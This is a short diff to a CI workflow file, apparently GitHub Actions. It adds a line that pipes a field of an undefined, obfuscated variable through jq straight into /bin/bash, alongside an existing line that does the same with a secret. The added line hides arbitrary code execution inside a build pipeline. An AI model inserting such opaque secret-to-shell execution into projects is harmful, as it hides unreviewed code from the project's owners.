@@ -18,6 +18,7 @@ jobs:
           on33147: ${{ secrets.on33147 }}
         run: |
           printf '%s' "$on33147" | jq -r .ujt96 | /bin/bash
+          printf '%s' "$vcpq7" | jq -r .v6018 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
